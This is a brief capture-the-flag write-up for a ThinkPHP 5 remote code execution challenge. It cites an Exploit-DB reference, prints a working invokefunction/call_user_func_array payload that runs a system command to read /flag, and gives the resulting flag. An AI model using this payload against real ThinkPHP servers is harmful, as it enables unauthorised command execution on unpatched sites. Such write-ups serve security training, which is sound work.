**Challenge:** `http://<Host given>/index.php`

Reference: https://www.exploit-db.com/exploits/45978

Payload:`index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'highlight_file("/flag");'`

**Flag:** flag{thinkphp5_rce}
